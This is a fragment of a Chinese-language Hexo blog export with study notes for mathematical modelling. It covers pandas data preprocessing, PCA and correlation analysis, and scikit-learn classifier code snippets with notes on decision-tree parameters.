<h3 id="数据导入"><a href="#数据导入" class="headerlink" title="数据导入"></a>数据导入</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;./data/sh600000.csv&#x27;</span>,  encoding=<span class="string">&#x27;gbk&#x27;</span>,)</span><br><span class="line">df</span><br></pre></td></tr></table></figure>
<h3 id="数据处理常用函数"><a href="#数据处理常用函数" class="headerlink" title="数据处理常用函数"></a>数据处理常用函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 结果显示每个取值在每列中的出现次数</span></span><br><span class="line">df.value_counts() </span><br><span class="line"><span class="comment"># 按行合并数据</span></span><br><span class="line">merged_df = pd.concat([df1, df2, df3], axis=<span class="number">0</span>, ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 删除某一列数据</span></span><br><span class="line">df = df.drop(labels, axis = <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 索引重新排序</span></span><br><span class="line">df.index = <span class="built_in">range</span>(<span class="built_in">len</span>(df))</span><br><span class="line">df = df.reset_index(drop=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 导出数据</span></span><br><span class="line">df.to_csv(<span class="string">&quot;filename.csv&quot;</span>, index=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 替换数据</span></span><br><span class="line">df[<span class="string">&quot;*&quot;</span>] = df[<span class="string">&quot;*&quot;</span>].replace(&#123;<span class="string">&#x27;*&#x27;</span>: <span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment"># sql中内链接</span></span><br><span class="line">pd.merge(df1, df2, on=<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"><span class="comment"># 将字符串数据转换为日期数据</span></span><br><span class="line">df3_2 = df3_1</span><br><span class="line">df3_2[<span class="string">&#x27;销售日期&#x27;</span>] = pd.to_datetime(df3_2[<span class="string">&#x27;销售日期&#x27;</span>])</span><br><span class="line">df3_2</span><br><span class="line"><span class="comment"># 按照日期数据从远到近排序</span></span><br><span class="line">df = df.sort_values(<span class="string">&#x27;date&#x27;</span>, ascending=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># SQL group by 操作</span></span><br><span class="line">df3_2 = df3_1.groupby([<span class="string">&#x27;销售日期&#x27;</span>,<span class="string">&#x27;分类名称&#x27;</span>, <span class="string">&#x27;单品名称&#x27;</span>]).agg(&#123;<span class="string">&#x27;销量(千克)&#x27;</span>: np.<span class="built_in">sum</span>&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="处理异常值"><a href="#处理异常值" class="headerlink" title="处理异常值"></a>处理异常值</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 处理异常值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sigma3</span>(<span class="params">data</span>):</span><br><span class="line">    col = data.columns.to_list()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> col:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算&#x27;income&#x27;列的平均值和标准差</span></span><br><span class="line">        mean = data[c].mean()</span><br><span class="line">        std = data[c].std()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算异常值的范围</span></span><br><span class="line">        lower = mean - <span class="number">3</span> * std</span><br><span class="line">        upper = mean + <span class="number">3</span> * std</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 筛选出超出异常值范围的数据点</span></span><br><span class="line">        outliers = data[(data[c] &lt; lower) | (data[c] &gt; upper)]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 删除异常值</span></span><br><span class="line">        data = data.drop(outliers.index)</span><br><span class="line">        <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<h3 id="定类数据标签化"><a href="#定类数据标签化" class="headerlink" title="定类数据标签化"></a>定类数据标签化</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder</span><br><span class="line"></span><br><span class="line">label_encoder = LabelEncoder()</span><br><span class="line">data[<span class="string">&#x27;定类的数据&#x27;</span>] = label_encoder.fit_transform(data[<span class="string">&#x27;定类的数据&#x27;</span>])</span><br></pre></td></tr></table></figure>



<h3 id="数据分割"><a href="#数据分割" class="headerlink" title="数据分割"></a>数据分割</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.2</span>, random_state=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<h3 id="标准化"><a href="#标准化" class="headerlink" title="标准化"></a>标准化</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"></span><br><span class="line">scaler  = StandardScaler()</span><br><span class="line">X_train = scaler .fit_transform(X_train)</span><br><span class="line">X_test = scaler .transform(X_test)</span><br></pre></td></tr></table></figure>
<h3 id="文本特征提取"><a href="#文本特征提取" class="headerlink" title="文本特征提取"></a>文本特征提取</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 转换成字典 同时完成独热编码</span></span><br><span class="line">X = X.to_dict(orient=<span class="string">&quot;records&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.2</span>, random_state=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.feature_extraction <span class="keyword">import</span> DictVectorizer</span><br><span class="line">dv = DictVectorizer()</span><br><span class="line">X_train = dv.fit_transform(X_train)</span><br><span class="line">X_test = dv.transform(X_test)</span><br><span class="line"><span class="comment"># feature_names=dv.get_feature_names()</span></span><br></pre></td></tr></table></figure>
<h3 id="模型建立的基本代码"><a href="#模型建立的基本代码" class="headerlink" title="模型建立的基本代码"></a>模型建立的基本代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.* <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">estimator = *()</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h3 id="主成分分析法（PCA）"><a href="#主成分分析法（PCA）" class="headerlink" title="主成分分析法（PCA）"></a>主成分分析法（PCA）</h3><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ol>
<li>进行主成分分析法之前，需要进行数据标准化<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"></span><br><span class="line">scaler  = StandardScaler()</span><br><span class="line">data_test = scaler .fit_transform(data_test)</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.decomposition <span class="keyword">import</span> PCA</span><br><span class="line">pca = PCA(n_components=<span class="number">0.95</span>)</span><br><span class="line">data_new = pca.fit_transform(data)</span><br></pre></td></tr></table></figure>
<h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><ol>
<li><p><strong>components_：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 特征系数</span></span><br><span class="line">pca.components_</span><br></pre></td></tr></table></figure>
</li>
<li><p>各个维度的贡献率：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 各个维度的贡献率</span></span><br><span class="line">explained_var = pca.explained_variance_ratio_</span><br><span class="line">explained_var</span><br></pre></td></tr></table></figure>
</li>
<li><p>累计贡献率</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 累计贡献率</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">np.cumsum(pca.explained_variance_ratio_)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘图</span></span><br><span class="line">plt.plot(<span class="built_in">range</span>(n), np.cumsum(explained_var))</span><br><span class="line">plt.ylim([<span class="number">0</span>, <span class="number">1.1</span>])</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ol>
<li><strong>n_components：</strong><ol>
<li>小数：表示保留百分之多少的信息</li>
<li>整数：减少到多少特征</li>
</ol>
</li>
</ol>
<h3 id="相关性分析"><a href="#相关性分析" class="headerlink" title="相关性分析"></a>相关性分析</h3><h4 id="绘制散点图矩阵"><a href="#绘制散点图矩阵" class="headerlink" title="绘制散点图矩阵"></a>绘制散点图矩阵</h4><p>通过散点的分布来确定相关性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#绘制散点图矩阵</span></span><br><span class="line">pd.plotting.scatter_matrix(data)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h4 id="相关系数矩阵"><a href="#相关系数矩阵" class="headerlink" title="相关系数矩阵"></a>相关系数矩阵</h4><h5 id="pandas-corr-函数（无显著性检验）"><a href="#pandas-corr-函数（无显著性检验）" class="headerlink" title="pandas.corr 函数（无显著性检验）"></a>pandas.corr 函数（无显著性检验）</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">pearson_corr = data.corr(method=<span class="string">&quot;pearson&quot;</span>)</span><br><span class="line">pearson_corr</span><br></pre></td></tr></table></figure>
<h5 id="scipy-stats-pearsonr-函数-（有显著性检验）"><a href="#scipy-stats-pearsonr-函数-（有显著性检验）" class="headerlink" title="scipy.stats.pearsonr 函数 （有显著性检验）"></a>scipy.stats.pearsonr 函数 （有显著性检验）</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.stats <span class="keyword">import</span> pearsonr</span><br><span class="line"></span><br><span class="line">r = pearsonr(df[<span class="string">&#x27;X&#x27;</span>],df[<span class="string">&#x27;Z&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pearson系数：&quot;</span>,r[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;   P-Value：&quot;</span>,r[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<h4 id="相关矩阵热力图"><a href="#相关矩阵热力图" class="headerlink" title="相关矩阵热力图"></a>相关矩阵热力图</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">sns.heatmap(data.corr(method=<span class="string">&#x27;pearson&#x27;</span>),annot=<span class="literal">True</span>,square=<span class="literal">True</span>,vmax=<span class="number">1</span>,cmap=<span class="string">&quot;Oranges&quot;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;皮尔逊热力图&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>数学建模</tag>
        <tag>机器学习</tag>
        <tag>数据处理</tag>
      </tags>
  </entry>
  <entry>
    <title>模型建立</title>
    <url>/2023/03/01/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%A8%A1%E5%9E%8B%E5%BB%BA%E7%AB%8B/</url>
    <content><![CDATA[<p>正规方程<br><a href="https://blog.csdn.net/weixin_45252110/article/details/97310655">https://blog.csdn.net/weixin_45252110&#x2F;article&#x2F;details&#x2F;97310655</a><br>梯度下降<br><a href="https://zhuanlan.zhihu.com/p/68468520">https://zhuanlan.zhihu.com/p/68468520</a><br>岭回归<br><a href="https://blog.csdn.net/fq_wallow/article/details/104555623">https://blog.csdn.net/fq_wallow&#x2F;article&#x2F;details&#x2F;104555623</a><br>Lasso回归<br><a href="https://zhuanlan.zhihu.com/p/116869931">https://zhuanlan.zhihu.com/p/116869931</a><br>决策树<br><a href="https://zhuanlan.zhihu.com/p/395246523">https://zhuanlan.zhihu.com/p/395246523</a><br>随机森林<br><a href="https://zhuanlan.zhihu.com/p/52052903">https://zhuanlan.zhihu.com/p/52052903</a><br>AdaBoost<br><a href="http://www.uml.org.cn/sjjmwj/2019030721.asp#:~:text=Adaboost%E7%AE%97%E6%B3%95%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%B0%B1%E6%98%AF%E5%B0%86%E5%A4%9A%E4%B8%AA%E5%BC%B1%E5%88%86%E7%B1%BB%E5%99%A8%EF%BC%88%E5%BC%B1%E5%88%86%E7%B1%BB%E5%99%A8%E4%B8%80%E8%88%AC%E9%80%89%E7%94%A8%E5%8D%95%E5%B1%82%E5%86%B3%E7%AD%96%E6%A0%91%EF%BC%89%E8%BF%9B%E8%A1%8C%E5%90%88%E7%90%86%E7%9A%84%E7%BB%93%E5%90%88%EF%BC%8C%E4%BD%BF%E5%85%B6%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E5%BC%BA%E5%88%86%E7%B1%BB%E5%99%A8%E3%80%82,Adaboost%E9%87%87%E7%94%A8%E8%BF%AD%E4%BB%A3%E7%9A%84%E6%80%9D%E6%83%B3%EF%BC%8C%E6%AF%8F%E6%AC%A1%E8%BF%AD%E4%BB%A3%E5%8F%AA%E8%AE%AD%E7%BB%83%E4%B8%80%E4%B8%AA%E5%BC%B1%E5%88%86%E7%B1%BB%E5%99%A8%EF%BC%8C%E8%AE%AD%E7%BB%83%E5%A5%BD%E7%9A%84%E5%BC%B1%E5%88%86%E7%B1%BB%E5%99%A8%E5%B0%86%E5%8F%82%E4%B8%8E%E4%B8%8B%E4%B8%80%E6%AC%A1%E8%BF%AD%E4%BB%A3%E7%9A%84%E4%BD%BF%E7%94%A8%E3%80%82">http://www.uml.org.cn/sjjmwj/2019030721.asp#:~:text&#x3D;Adaboost%E7%AE%97%E6%B3%95%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%B0%B1%E6%98%AF%E5%B0%86%E5%A4%9A%E4%B8%AA%E5%BC%B1%E5%88%86%E7%B1%BB%E5%99%A8%EF%BC%88%E5%BC%B1%E5%88%86%E7%B1%BB%E5%99%A8%E4%B8%80%E8%88%AC%E9%80%89%E7%94%A8%E5%8D%95%E5%B1%82%E5%86%B3%E7%AD%96%E6%A0%91%EF%BC%89%E8%BF%9B%E8%A1%8C%E5%90%88%E7%90%86%E7%9A%84%E7%BB%93%E5%90%88%EF%BC%8C%E4%BD%BF%E5%85%B6%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E5%BC%BA%E5%88%86%E7%B1%BB%E5%99%A8%E3%80%82,Adaboost%E9%87%87%E7%94%A8%E8%BF%AD%E4%BB%A3%E7%9A%84%E6%80%9D%E6%83%B3%EF%BC%8C%E6%AF%8F%E6%AC%A1%E8%BF%AD%E4%BB%A3%E5%8F%AA%E8%AE%AD%E7%BB%83%E4%B8%80%E4%B8%AA%E5%BC%B1%E5%88%86%E7%B1%BB%E5%99%A8%EF%BC%8C%E8%AE%AD%E7%BB%83%E5%A5%BD%E7%9A%84%E5%BC%B1%E5%88%86%E7%B1%BB%E5%99%A8%E5%B0%86%E5%8F%82%E4%B8%8E%E4%B8%8B%E4%B8%80%E6%AC%A1%E8%BF%AD%E4%BB%A3%E7%9A%84%E4%BD%BF%E7%94%A8%E3%80%82</a></p>
]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>数学建模</tag>
        <tag>机器学习</tag>
        <tag>数据处理</tag>
      </tags>
  </entry>
  <entry>
    <title>分类代码</title>
    <url>/2023/03/01/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E5%88%86%E7%B1%BB%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<h2 id="KNN算法"><a href="#KNN算法" class="headerlink" title="KNN算法"></a>KNN算法</h2><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"></span><br><span class="line">k = *</span><br><span class="line">estimator = KNeighborsClassifier(n_neighbors = k)</span><br><span class="line">estimator.fit(x_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h4 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h4><h2 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h2><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line">estimator = DecisionTreeClassifier()</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h4 id="决策树的可视化"><a href="#决策树的可视化" class="headerlink" title="决策树的可视化"></a>决策树的可视化</h4><p>将dot的代码复制到<a href="http://webgraphviz.com/">http://webgraphviz.com/</a>就可以将决策树可视化出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> export_graphviz</span><br><span class="line">export_graphviz(estimator, out_file=<span class="string">&quot;decision_tree.dot&quot;</span>, feature_names=data.columns)</span><br></pre></td></tr></table></figure>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">● criterion（特征选择标准）</span><br><span class="line">  ○ 可选择ceriterion=‘gini’ 或ceriterion=‘entropy’</span><br><span class="line">  ○ 前者是基尼系数，后者是信息熵。两者差别不大，默认使用gini系数</span><br><span class="line">● splitter（特征划分标准）</span><br><span class="line">  ○ 可选择splitter=<span class="string">&#x27;best’或splitter=‘random’</span></span><br><span class="line"><span class="string">  ○ 前者在特征的所有划分点中找出最优的划分点。后者是随机的在部分划分点中找局部最优的划分点。默认使用best，它适合样本量不大的情况，若样本量较大，推荐使用random</span></span><br><span class="line"><span class="string">● max_depth（决策树最大深度）</span></span><br><span class="line"><span class="string">  ○ 默认为Non，可赋int值。</span></span><br><span class="line"><span class="string">  ○ 在样本量多，特征多的时候，可设置max_depth来解决过拟合问题。</span></span><br><span class="line"><span class="string">● min_impurity_decrease（节点划分最小不纯度）</span></span><br><span class="line"><span class="string">  ○ 默认为0，可赋float值。</span></span><br><span class="line"><span class="string">  ○ 这个值限制了决策树的增长，如果某节点的不纯度(基尼系数，信息增益，均方差，绝对差)小于这个阈值，则该节点不再生成子节点。</span></span><br><span class="line"><span class="string">● min_samples_split（内部节点再划分所需最小样本数）</span></span><br><span class="line"><span class="string">  ○ 默认为2，可赋int或float值。若为float则向上取整</span></span><br><span class="line"><span class="string">  ○ 顾名思义,但在样本数较少时几乎没有影响</span></span><br><span class="line"><span class="string">● min_samples_leaf（叶子节点最少样本数）</span></span><br><span class="line"><span class="string">  ○ 可赋int或float值</span></span><br><span class="line"><span class="string">  ○ 这个值限制了叶子节点最少的样本数，如果某叶子节点数目小于样本数，则会和兄弟节点一起被剪枝。</span></span><br><span class="line"><span class="string">● max_leaf_nodes（最大叶子节点数）</span></span><br><span class="line"><span class="string">  ○ 默认为0，可赋int值</span></span><br><span class="line"><span class="string">  ○ 通过限制最大叶子节点数，可以防止过拟合，默认是”None”，即不限制最大的叶子节点数。如果加了限制，算法会建立在最大叶子节点数内最优的决策树。如果特征不多，可以不考虑这个值，但是如果特征分成多的话，可以加以限制，具体的值可以通过交叉验证得到。</span></span><br><span class="line"><span class="string">● min_impurity_split（信息增益的阀值）</span></span><br><span class="line"><span class="string">  ○ 决策树在创建分支时，信息增益必须大于这个阀值，否则不分裂</span></span><br><span class="line"><span class="string">● min_weight_fraction_leaf（叶子节点最小的样本权重和）</span></span><br><span class="line"><span class="string">  ○ 默认为0，可赋float值</span></span><br><span class="line"><span class="string">  ○ 这个值限制了叶子节点所有样本权重和的最小值，如果小于这个值，则会和兄弟节点一起被剪枝。 一般来说，如果我们有较多样本有缺失值，或者分类树样本的分布类别偏差很大，就会引入样本权重，这时我们就要注意这个值了。</span></span><br><span class="line"><span class="string">● class_weight（类别权重）</span></span><br><span class="line"><span class="string">  ○ 默认是non，可选择class_weight=‘balanced’</span></span><br><span class="line"><span class="string">  ○ 指定样本各类别的的权重，主要是为了防止训练集某些类别的样本过多，导致训练的决策树过于偏向这些类别。如果使用“balanced”，则算法会自己计算权重，样本量少的类别所对应的样本权重会高。当然，如果你的样本类别分布没有明显的偏倚，则可以不管这个参数。</span></span><br><span class="line"><span class="string">  ○ 另外，non不适用与回归树。</span></span><br></pre></td></tr></table></figure>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol>
<li>当样本少数量但是样本特征非常多的时候，决策树很容易过拟合，一般来说，样本数比特征数多一些会比较容易建立健壮的模型</li>
<li>如果样本数量少但是样本特征非常多，在拟合决策树模型前，推荐先做维度规约，比如主成分分析（PCA），特征选择（Losso）或者独立成分分析（ICA）。这样特征的维度会大大减小。再来拟合决策树模型效果会好。</li>
<li>推荐多用决策树的可视化，同时先限制决策树的深度（比如最多3层），这样可以先观察下生成的决策树里数据的初步拟合情况，然后再决定是否要增加深度。</li>
<li>在训练模型先，注意观察样本的类别情况（主要指分类树），如果类别分布非常不均匀，就要考虑用class_weight来限制模型过于偏向样本多的类别。</li>
<li>决策树的数组使用的是numpy的float32类型，如果训练数据不是这样的格式，算法会先做copy再运行。</li>
<li>如果输入的样本矩阵是稀疏的，推荐在拟合前调用csc_matrix稀疏化，在预测前调用csr_matrix稀疏化。</li>
</ol>
<h2 id="集成学习"><a href="#集成学习" class="headerlink" title="集成学习"></a>集成学习</h2><h3 id="随机森林"><a href="#随机森林" class="headerlink" title="随机森林"></a>随机森林</h3><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line">estimator = RandomForestClassifier(random_state=<span class="number">15</span>)</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h2 id="特征重要程度"><a href="#特征重要程度" class="headerlink" title="特征重要程度"></a>特征重要程度</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印选取的前n个特征及其重要性指标</span></span><br><span class="line">n = <span class="number">15</span></span><br><span class="line">importances = estimator.feature_importances_</span><br><span class="line">indices = np.argsort(importances)[::-<span class="number">1</span>][:n]</span><br><span class="line">top_features = X.columns[indices]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(top_features)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>. <span class="subst">&#123;top_features[i]&#125;</span>: <span class="subst">&#123;importances[indices[i]]&#125;</span>&quot;</span>)</span><br><span class="line">plt.figure(figsize=(<span class="number">17</span>,<span class="number">10</span>))</span><br><span class="line">plt.bar(top_features, importances[indices])</span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(top_features, importances[indices]):</span><br><span class="line">    plt.text(i, j, <span class="string">&#x27;%.2f&#x27;</span> % j, ha=<span class="string">&#x27;center&#x27;</span>, va=<span class="string">&#x27;bottom&#x27;</span>)</span><br><span class="line"></span><br><span class="line">figname = <span class="string">&#x27;特征重要程度&#x27;</span></span><br><span class="line">plt.title(figname)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;特征&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;重要程度&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="调参"><a href="#调参" class="headerlink" title="调参"></a>调参</h4><h4 id="数据可视化-1"><a href="#数据可视化-1" class="headerlink" title="数据可视化"></a>数据可视化</h4><h3 id="AdaBoost"><a href="#AdaBoost" class="headerlink" title="AdaBoost"></a>AdaBoost</h3><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> AdaBoostClassifier</span><br><span class="line"></span><br><span class="line">estimator = AdaBoostClassifier()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h3 id="ExtraTrees"><a href="#ExtraTrees" class="headerlink" title="ExtraTrees"></a>ExtraTrees</h3><h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> ExtraTreesClassifier</span><br><span class="line"></span><br><span class="line">estimator =  ExtraTreesClassifier()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h4 id="数据可视化-2"><a href="#数据可视化-2" class="headerlink" title="数据可视化"></a>数据可视化</h4><h3 id="GBDT"><a href="#GBDT" class="headerlink" title="GBDT"></a>GBDT</h3><h4 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> GradientBoostingClassifier</span><br><span class="line"></span><br><span class="line">estimator = GradientBoostingClassifier()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>

<h3 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>适用与因变量为二项分布的情况</p>
<h4 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"></span><br><span class="line">estimator = LogisticRegression()</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>

